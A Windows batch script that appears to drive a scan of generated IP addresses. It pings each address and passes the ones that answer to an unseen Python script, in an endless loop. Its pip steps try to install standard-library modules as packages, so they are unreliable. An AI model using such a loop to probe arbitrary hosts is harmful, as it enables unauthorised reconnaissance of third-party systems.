@echo off
Powershell.exe -command "Clear-Content "succeeded_ips.txt""
echo loading..
echo if this is your first time using this you can wait about 2-4 minutes
winget install 9NCVDN91XZQP >nul
pip install random --quiet >nul
pip install socket --quiet >nul
pip install struct --quiet >nul
pip install sys --quiet >nul
cls
echo trying to find IPs
setlocal enabledelayedexpansion
:read
:: Read IP addresses from the text file
for /f "delims=" %%a in (ip_list.txt) do (
    ping -n 1 -l 1 %%a >nul
    if !errorlevel! == 0 (
        echo %%a is reachable
        python succeded.py %%a
    )
)

python ip_gen.py
goto read